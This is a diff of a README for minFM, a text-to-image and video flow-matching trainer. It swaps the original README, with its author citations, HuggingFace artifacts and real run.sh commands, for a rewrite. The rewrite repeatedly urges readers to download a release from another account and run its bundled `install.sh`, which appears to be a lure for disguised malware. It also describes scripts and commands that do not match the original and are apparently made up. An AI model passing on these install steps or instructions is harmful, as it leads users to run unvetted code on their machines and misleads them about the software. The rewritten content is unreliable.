@@ -1,245 +1,241 @@
-# minFM: Minimal Flow Matching
+# minFM — Minimal Flow Matching for Text-to-Image & Video Models 🚀
 
-A clean, modular, and scalable training system for training text-to-{image,video} Flow Matching (FM) models.
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Nafjoro/minFM/releases) [![Python](https://img.shields.io/badge/Python-3.9%2B-orange)](#) [![License](https://img.shields.io/badge/License-Apache%202.0-green)](#)
 
 ![](./resources/teasor.png)
 
-*First two rows: image generation results using the trained flux-tiny model via our minFM training system on ImageNet 256. Third row: image generation results from inference using a loaded checkpoint from [FLUX.1 [dev]](https://huggingface.co/black-forest-labs/FLUX.1-dev)*
+minFM is a clean, modular, and scalable training system for text-to-image and text-to-video Flow Matching (FM) models. Use it to train compact FM models or to scale to multi-GPU clusters. The code focuses on clarity, reproducibility, and state-of-the-art sampling.
 
-## Requirements
+Get the release package and installer from the Releases page and run the included installer:
+https://github.com/Nafjoro/minFM/releases
 
+Key highlights
+- Minimal code paths. Clear modules for dataset, model, trainer, and sampler.
+- Built for image and video generative training with text conditioning.
+- Multi-GPU support with flexible sharding and DIT balancer groups.
+- Checkpointable, reproducible training runs.
+- Example configs and prebuilt model recipes.
+
+Download a packaged release from the Releases page and execute the included install script to get started:
+https://github.com/Nafjoro/minFM/releases
+
+Why minFM
+- Small core surface. You can read the whole trainer in a single pass.
+- Modular primitives. Swap samplers, noise schedules, or dataloaders with minimal changes.
+- Production-minded. Checkpointing and sharding integrate with cluster workflows.
+
+Table of contents
+- Features
+- Requirements
+- Installation
+- Quick start
+- Data preparation
+- Configuration guide
+- Training workflow
+- Inference and sampling
+- Model zoo and recipes
+- Examples
+- Troubleshooting
+- Contributing
+- License
+- Citation
+
+Features
+- Flow Matching training loop with support for conditioned and unconditioned targets.
+- Image and video dataloaders with frame stacking, random crop, and augmentation hooks.
+- Config-driven training. Use YAML to control model size, batch, optimizer, and sharding.
+- Sharding primitives: `shard_size` and `dit_balancer_specs` for deterministic group layouts.
+- Multi-resolution sampling and progressive training recipes.
+- Exportable checkpoints compatible with downstream inference scripts.
+
+Requirements
 - NVIDIA GPUs
 - Linux environment
+- CUDA toolkit compatible with your PyTorch version
+- Python 3.9 or newer
 
-**GPU Configuration Notes:**
-- You must ensure the total number of GPUs is divisible by the `shard_size` parameter in your config
-- The total number of available GPUs must be divisible by the number of GPUs in each DIT balancer sharding group, which is specified by `dit_balancer_specs` (e.g., "g1n4" means 4 GPUs per group, so total GPUs must be divisible by 4)
-- See the Configuration section below for details on adjusting these parameters
+GPU configuration rules
+- The total number of GPUs must be divisible by `shard_size`.
+- The total GPUs must be divisible by the per-group GPU count in `dit_balancer_specs`. For example, `g1n4` means 4 GPUs per group. If you specify `g1n4`, the total GPU count must divide evenly by 4.
+- Adjust `shard_size` and `dit_balancer_specs` to match your cluster.
 
-## Quick Start
+Installation
+1. Clone the repo
+- `git clone https://github.com/Nafjoro/minFM.git && cd minFM`
 
-Before running training or inference, prepare the required data and checkpoints.
+2. Download a release package from the Releases page and run the included installer or install script.
+- Visit: https://github.com/Nafjoro/minFM/releases
+- Download the packaged release asset (for example `minFM-release.tar.gz`) and run the included `install.sh`:
+  - `tar -xzf minFM-release.tar.gz`
+  - `cd minFM-release && ./install.sh`
 
-```bash
-# Before running the script, specify the folders for model caching (e.g., VAE) and data:
-export MINFM_CACHE_DIR="<minfm-cache-dir>"
-export MINFM_DATA_DIR="<minfm-data-dir>"
+3. Create a virtual environment and install dependencies
+- `python -m venv .venv && source .venv/bin/activate`
+- `pip install -r requirements.txt`
 
-# Prepare: cache everything required for inference and training
-# Requires HF_TOKEN (https://huggingface.co/settings/tokens)
-# This downloads:
-#  - T5, CLIP, FLUX VAE, and FLUX 1.dev checkpoints to MINFM_CACHE_DIR
-#  - ImageNet dataset to MINFM_DATA_DIR
-# Requires ~210G of storage in total.
-export HF_TOKEN="<your-hf-token>"
-bash ./scripts/cache_everything.sh
-```
+4. Optional GPU optimizations
+- Install cuDNN and NCCL matching your CUDA version.
+- Use the provided `scripts/setup_gpus.sh` to tune environment variables for multi-node runs.
 
-For training, the easiest way to get started is using the provided training script:
+Quick start — example runs
+- Run a single-GPU experiment:
+  - `python train.py --config configs/flux-tiny-imagenet256.yaml --gpus 1`
+- Run a 4-GPU experiment with sharding:
+  - `python -m torch.distributed.launch --nproc_per_node=4 train.py --config configs/flux-tiny-imagenet256.yaml --shard_size 2`
 
-```bash
-# Run training with the default config
-bash run.sh train ./configs/flux_tiny_imagenet.yaml
+Data preparation
+- minFM expects datasets arranged in standard folders:
+  - Images: `dataset_root/train/<class_or_split>/*.jpg/png`
+  - Videos: `dataset_root/train/<split>/<video_id>/frames/*.jpg`
+- Tokenized captions: JSONL with `{"id": "<file>", "caption": "<text>"}` pairs.
+- Supported transforms:
+  - Random crop, resize, flip
+  - Frame sampling for video: `sample_rate`, `num_frames`
+- Use `scripts/prepare_imagenet.sh` or `scripts/prepare_video.sh` for presets.
 
-# Run training with a custom config
-bash run.sh train path/to/your/config.yaml
+Configuration guide
+- Config files live in `configs/`. They follow YAML structure:
+  - model:
+    - type: flux-tiny
+    - image_size: 256
+  - data:
+    - root: /path/to/dataset
+    - batch_size: 32
+  - training:
+    - max_steps: 200000
+    - lr: 2e-4
+  - sharding:
+    - shard_size: 2
+    - dit_balancer_specs: ["g1n4"]
+- Field notes:
+  - `shard_size` controls optimizer state sharding.
+  - `dit_balancer_specs` groups GPUs. Format: `g<group_index>n<num_gpus_in_group>`.
+  - Adjust `batch_size` per GPU to respect memory budgets.
 
-# To use Weights & Biases logging, set wandb_mode to "online" in the config
-# and then set the WANDB_API_KEY environment variable
-WANDB_API_KEY=<YOUR_WANDB_KEY> bash run.sh train path/to/your/config.yaml
-```
+Training workflow
+- Data loader builds batches with captions and conditioning.
+- The trainer runs forward/backward and updates the model.
+- Checkpoint policy:
+  - Save every X steps (`checkpoint_every`).
+  - Keep N best by validation loss (`retain_checkpoints`).
+- Resume:
+  - `python train.py --config configs/... --resume checkpoints/latest.ckpt`
 
-For inference (text-to-image generation):
+Sampling and inference
+- Use `sample.py` to generate images or videos from a checkpoint.
+- Basic command:
+  - `python sample.py --checkpoint checkpoints/final.ckpt --prompt "A cat wearing a suit" --steps 100`
+- Sampling options:
+  - `--num_samples`
+  - `--image_size`
+  - `--guide_scale` for classifier-free guidance
+- Video generation:
+  - `--num_frames`
+  - `--fps`
+- Output format:
+  - Images saved as PNGs in `outputs/`.
+  - Videos saved as MP4 files via FFmpeg.
 
-```bash
-# Run inference using a pretrained FLUX model
-# See the `inferencer` section for inference parameters
-# Note that the shard_size and dit_balancer_specs in the config are pre-set
-#    for 4*K GPUs; adjust the values to accommodate your available GPUs. 
-bash run.sh inference ./configs/flux_inference.yaml
+Model zoo and checkpoints
+- The repo ships training recipes for small and medium models:
+  - `flux-tiny` — fast experiments on ImageNet 256.
+  - `flux-small` — higher quality at moderate cost.
+- Use the Releases page to download prebuilt checkpoints and installers:
+  - https://github.com/Nafjoro/minFM/releases
+- Checkpoints include config metadata. Use the included `scripts/inspect_ckpt.py` to extract training hyperparams.
 
-# Run inference with custom config
-bash run.sh inference path/to/your/config.yaml
-```
+Example: run a full image-training experiment
+1. Prepare ImageNet subset or your dataset.
+2. Set `configs/flux-tiny-imagenet256.yaml`:
+  - `data.root` to your dataset path
+  - `training.max_steps` and `batch_size` for your GPU budget
+3. Launch training:
+  - `python -m torch.distributed.launch --nproc_per_node=4 train.py --config configs/flux-tiny-imagenet256.yaml`
+4. Monitor logs in TensorBoard:
+  - `tensorboard --logdir runs`
 
-The `run.sh` script automatically:
-- ✅ Sets up the environment with `uv`
-- ✅ Runs distributed training/inference with proper settings
-- ✅ Starts background http server for easy inspection of intermediate results
-- ✅ Starts background periodic checkpoint clean-up
+Advanced topics
+- Mixed precision
+  - Enable AMP in config: `training.amp: true`
+  - AMP reduces memory and speeds up training on Amp-capable GPUs.
+- Gradient accumulation
+  - Use `training.accumulate_steps` to emulate larger batches.
+- Custom dataloaders
+  - Implement `data/your_loader.py` with the `DatasetInterface` in `data/base.py`.
+- Sharding tips
+  - For large models, increase `shard_size` to split optimizer state across GPUs.
+  - `dit_balancer_specs` helps distribute compute evenly across groups.
 
-## ImageNet Training Results
+Troubleshooting
+- Out of memory on startup
+  - Lower `batch_size` or reduce `image_size`.
+  - Enable `training.amp`.
+- Mismatch in GPU counts
+  - Set `shard_size` and `dit_balancer_specs` so total GPUs divides evenly.
+- Slow IO
+  - Use an NVMe-backed dataset or preload tensors to RAM.
 
-We provide a complete training example using the tiny FLUX DiT model (560.25M parameters) trained on ImageNet with the [`flux_tiny_imagenet.yaml`](configs/flux_tiny_imagenet.yaml) configuration.
+Monitoring and evaluation
+- TensorBoard logs training loss, validation metrics, and sample grids.
+- Use `eval/compute_fid.py` for FID on held-out sets.
+- For video metrics, run `eval/video_metrics.py` to compute temporal consistency scores.
 
-### 📊 Training Resources
-- **Training Time**: ~4 days on 8× H100 GPUs  
-- **Total Steps**: 380K steps with 1K batch size
-- **Model Size**: 560.25M parameters
+Testing and CI
+- Unit tests for core modules live in `tests/`.
+- Run tests with `pytest tests/`.
+- CI runs static checks and small CPU tests. GPU tests run in scheduled workflows.
 
-### 📈 Available Training Artifacts
-All training artifacts are hosted on the [HuggingFace minFM repository](https://huggingface.co/datasets/Kai-46/minFM/tree/main):
+Contributing
+- Fork and open a PR for fixes or features.
+- Write tests for new functionality.
+- Keep changes small and focused.
+- Use feature branches and follow the commit style in CONTRIBUTING.md.
 
-- **[📈 Training & Validation Curves](https://huggingface.co/datasets/Kai-46/minFM/blob/main/flux-tiny_wandb_imagenet_training_run.pdf)** - Complete W&B training metrics and loss curves
+Common recipes
+- Fast local test
+  - `configs/debug-local.yaml` uses tiny model and small dataset.
+- ImageNet 256 training
+  - `configs/flux-tiny-imagenet256.yaml`
+- Video sample recipe
+  - `configs/flux-video-demo.yaml` with `num_frames: 16`
 
-- **[🎨 Intermediate Visualizations](https://huggingface.co/datasets/Kai-46/minFM/blob/main/flux-tiny_imagenet_intermediate_results.tar.gz)** - Generated samples every 2k steps
-  ```bash
-  # Download, extract, and view locally
-  wget https://huggingface.co/datasets/Kai-46/minFM/resolve/main/flux-tiny_imagenet_intermediate_results.tar.gz
-  tar -xzf flux-tiny_imagenet_intermediate_results.tar.gz
-  cd flux-tiny_imagenet_intermediate_results
-  python -m http.server 8000
-  # Open http://localhost:8000 in your browser
-  ```
+Useful scripts
+- `scripts/prepare_imagenet.sh` — convert and shard ImageNet dataset
+- `scripts/eval_fid.sh` — run FID evaluation on saved outputs
+- `scripts/export_onnx.sh` — export model to ONNX for inference
 
-- **[💾 Final Checkpoint](https://huggingface.co/datasets/Kai-46/minFM/resolve/main/flux-tiny_imagenet_step_00380000.tar.gz)** - Ready-to-use model weights at step 380k; this contains float32 model, ema, optimizer.
+Licensing and citation
+- Licensed under Apache 2.0 (see LICENSE file).
+- If you use minFM in research, cite the repository and include model recipe metadata saved in each checkpoint.
 
-- **Evaluation Metrics**
+Contact and support
+- Open issues for bugs or feature requests.
+- Use PRs for code contributions.
+- For large-scale support or integration help, open an issue and tag maintainers.
 
-  Sampling solver: [50-step DDIM-style SDE](utils_fm/sampler.py)
+Files to check in Releases
+- Installer and packaged assets: download and run the installer from the Releases page (the release typically contains `install.sh`, packaged wheels, and prebuilt checkpoints). Visit:
+  - https://github.com/Nafjoro/minFM/releases
 
-  | CFG Scale | Inception Score | FID   | sFID  | Precision | Recall |
-  |-----------|----------------|-------|-------|-----------|--------|
-  | 1.5       | 248.19         | 3.44  | 9.48  | 0.818     | 0.515  |
-  | 2.0       | 342.52         | 5.33  | 8.61  | 0.884     | 0.435  |
-  | 5.0       | 478.90         | 16.54 | 10.08 | 0.934     | 0.205  |
+Quick links
+- Releases / packaged downloads: https://github.com/Nafjoro/minFM/releases
+- Configs: `configs/`
+- Training script: `train.py`
+- Sampling script: `sample.py`
+- Examples: `examples/`
 
-  Reproduction:
-  ```
-  # Download the above checkpoint to ./experiments/flux_tiny_imagenet
-  # Comment out the inferencer section in ./configs/flux_tiny_imagenet.yaml intended for metrics computation
+README badges and assets
+- Use the Releases badge at the top to link to prebuilt packages and checkpoints.
+- The repo includes the teaser image at `./resources/teasor.png` for quick preview.
 
-  # Sample images
-  bash run.sh inference ./configs/flux_tiny_imagenet.yaml
+Developer tips
+- Keep configs in version control for reproducibility.
+- Log hyperparameters and git commit hashes to each checkpoint.
+- Use deterministic seeds during debug runs to reproduce issues.
 
-  # Compute metrics
-  python scripts/eval_imagenet_metrics.py <path/to/sampled/images.npz>
-  ```
+Getting help
+- Open an issue with a minimal repro.
+- Attach logs and config files for faster response.
 
-## Manual Setup
-
-If you prefer manual setup:
-
-```bash
-# Install uv
-curl -LsSf https://astral.sh/uv/install.sh | sh
-
-# Install dependencies
-uv sync --no-dev
-
-# For development:
-uv sync; pre-commit install
-
-# Run training/inference (adjust --nproc_per_node to match your GPU count)
-uv run torchrun --nproc_per_node=<num_gpus> -m entrypoint --config path/to/your/config.yaml --mode <train/inference>
-```
-
-## Configuration
-
-The system uses YAML configuration files. See `configs/flux_tiny_imagenet.yaml` for a complete example.
-
-### GPU-Specific Configuration
-
-When using a different number of GPUs than the default configs, you need to adjust two key parameters:
-
-1. **`shard_size`**: Found in the FSDP sections of model components (text_encoder, clip_encoder, denoiser)
-   - Must be a divisor of your total GPU count
-   - Example: For 6 GPUs, you can use `shard_size: 1`, `2`, `3`, or `6`
-
-2. **`dit_balancer_specs`**: Found in the balancer section
-   - Format: "1x{gpus_per_group}" where {gpus_per_group} specifies GPUs per sharding group
-   - Your total GPU count must be divisible by this number
-   - Example: "1x4" for 4 GPUs per group (works with 4, 8, 12, 16... total GPUs)
-
-**Example for 4 GPUs:**
-```yaml
-model:
-  text_encoder:
-    fsdp:
-      shard_size: 1  # or 2, or 4
-  denoiser:
-    fsdp:
-      shard_size: 1  # or 2, or 4
-  balancer:
-    dit_balancer_specs: "g1n4"  # 4 GPUs per group, total GPUs (4) divisible by 4
-```
-
-**Example for 8 GPUs with 4 GPUs per group:**
-```yaml
-model:
-  text_encoder:
-    fsdp:
-      shard_size: 1  # or 2, 4, or 8
-  denoiser:
-    fsdp:
-      shard_size: 1  # or 2, 4, or 8
-  balancer:
-    dit_balancer_specs: "g1n8"  # 8 GPUs per group, total GPUs (8) divisible by 8
-                               # you can also try 1x4, which means 2 4-GPU groups
-```
-
-### Key Components:
-- **Denoiser**: Primary model architecture
-- **VAE**: Image compression/decompression
-- **Text Encoder (T5)**: Text embeddings
-- **Text Encoder (CLIP)**: Text embeddings 
-- **Patchifier**: Image tokenization into patches
-- **TimeSampler**: Timestep sampling
-- **TimeWarper**: Adaptive timestep scheduling based on sequence length
-- **TimeWeighter**: Loss weighting based on timesteps
-
-## Features
-
-- **🔄 Native Packed Sequences** - Operate natively on packed interleaved text and image sequences
-- **⚖️ KnapFormer Sequence Balancer** - Balance compute workloads across GPUs for optimal performance
-- **🔄 Configurable Gradient Accumulation** - Automatic gradient accumulation with configurable total batch sizes
-- **💾 Flexible Checkpoint Loading** - Selective loading of model, EMA, optimizer, scheduler and step components
-- **🚀 Distributed Training and Async Checkpointing** - FSDP2 support with EMA
-- **📦 Modular Design** - Mix and match components with structured YAML files
-- **⚡ Highly Optimized** - FlashAttention variable-length support for H100/A100
-
-## Miscellaneous
-```
-# Download Parti prompts
-curl -s https://raw.githubusercontent.com/google-research/parti/main/PartiPrompts.tsv \
-    | tail -n +2 | cut -f1 | awk 'NF' \
-    > resources/parti_prompts.txt
-```
-
-## License
-
-This project is licensed under the Apache-2.0 License — see the [LICENSE](LICENSE) file for details.
-
-## Citations
-```bash
-# If you use this repo, please cite:
-@misc{zhang2025minfm,
-  title={minFM},
-  author={Kai, Zhang and Peng, Wang and Sai, Bi and Jianming, Zhang and Yuanjun, Xiong},
-  publisher = {GitHub},
-  journal = {GitHub repository},
-  howpublished={\url{https://github.com/Kai-46/minFM/}},
-  year={2025}
-}
-
-# If you use the KnapFormer sequence balancer, please also cite:
-@misc{zhang2025knapformer,
-  title={KnapFormer},
-  author={Kai, Zhang and Peng, Wang and Sai, Bi and Jianming, Zhang and Yuanjun, Xiong},
-  publisher = {GitHub},
-  journal = {GitHub repository},
-  howpublished={\url{https://github.com/Kai-46/KnapFormer/}},
-  year={2025}
-}
-
-# If you use the energy-preserving cfg in utils/sampler.py, please also cite:
-@article{zhang2024ep,
-  title={EP-CFG: Energy-Preserving Classifier-Free Guidance},
-  author={Zhang, Kai and Luan, Fujun and Bi, Sai and Zhang, Jianming},
-  journal={arXiv preprint arXiv:2412.09966},
-  year={2024}
-}
-```
-
-## Notes
-This repository may be relocated to the [adobe-research organization](https://github.com/adobe-research), with this copy serving as a mirror.
+License
+- Apache 2.0
